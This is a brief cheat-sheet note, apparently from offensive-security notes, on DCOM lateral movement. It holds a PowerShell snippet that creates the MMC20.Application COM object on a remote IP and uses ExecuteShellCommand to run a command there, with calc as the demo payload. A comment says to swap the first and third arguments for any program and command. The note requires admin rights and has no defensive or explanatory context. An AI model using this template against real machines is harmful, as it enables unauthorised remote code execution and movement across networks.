Requires a PowerShell with *admin* privs!
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

# Only change the 1st and 3rd arguments
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```
